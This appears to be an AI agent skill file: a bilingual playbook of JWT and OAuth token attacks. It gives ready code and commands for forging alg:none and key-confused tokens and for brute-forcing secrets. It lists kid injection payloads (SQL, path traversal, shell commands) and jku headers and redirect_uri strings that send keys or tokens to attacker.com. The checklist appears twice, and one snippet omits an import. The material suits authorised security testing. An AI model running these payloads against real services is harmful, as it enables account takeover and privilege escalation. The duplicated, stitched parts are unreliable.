---
name: jwt-oauth-token-attacks
description: >-
  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
---

## 一、JWT 测试

### 1.1 算法混淆攻击

```python
import jwt
import base64

# 原始 JWT
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"

# 攻击 1: alg=none（去除签名）
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
fake_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

# 攻击 2: RS256 → HS256（用公钥作为 HMAC 密钥）
# 1. 获取公钥（从 /jwks.json 或证书）
# 2. 用公钥作为 HS256 的密钥签名
public_key = open('public.pem', 'rb').read()
fake_token = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

### 1.2 密钥爆破

```bash
# jwt_tool 爆破
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat 爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 1.3 kid 注入

```python
# kid (Key ID) 参数可能存在注入
# SQL 注入
header = {
    "alg": "HS256",
    "kid": "1' UNION SELECT 'secret'--"
}

# 路径遍历
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # 空文件作为密钥
}

# 命令注入
header = {
    "alg": "HS256",
    "kid": "key.txt; whoami"
}
```

### 1.4 jku/x5u 头部篡改

```python
# jku: JWK Set URL（指向攻击者服务器）
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# 攻击者服务器上的 jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",  # 攻击者的公钥
      "e": "AQAB"
    }
  ]
}

# 用攻击者私钥签名 JWT
```

### 1.5 exp 过期时间篡改

```python
import jwt
import time

# 修改 exp 为未来时间
payload = {
    "user": "admin",
    "exp": int(time.time()) + 86400 * 365  # 1年后过期
}

# 如果服务端不验证签名，直接修改 payload
```

### 1.6 签名剥离

```bash
# 去除签名部分，只保留 header.payload.
# 部分实现可能不检查签名是否存在

# 原始: eyJhbGci...header.eyJ1c2Vy...payload.c2lnbmF0dXJl...signature
# 修改: eyJhbGci...header.eyJ1c2Vy...payload.
```

---

## 补充：jwt-oauth-token-attacks

### jwt-oauth-token-attacks

### JWT and OAuth 2.0 Token Attacks


## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
### → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
### → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
### Burp JWT Editor / python-jwt attack:
### Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

### Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
### OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
### → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
### Step 1: Obtain public key (PEM format)
### From: /api/.well-known/jwks.json → convert to PEM
### From: /certs endpoint
### From: OpenSSL extraction from HTTPS cert

### Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

### Step 3: Manually:
### Modify header: {"alg":"HS256","typ":"JWT"}
### Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
### hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

### john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

### jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
### Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

### Create JWKS:
python3 -c "
import json, base64, struct
### ... (use python-jwcrypto or jwt_tool to export JWKS)
"

### Host malicious JWKS at attacker.com/malicious-jwks.json
### Sign JWT with attacker's private key
### Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ 用户给的会话禁止调 logout，不测「退出后会话还在」。自己注册/匿名建的测试号可以测退出后票是否失效
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ 用户给的会话禁止调 logout，不测「退出后会话还在」。自己注册/匿名建的测试号可以测退出后票是否失效
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---
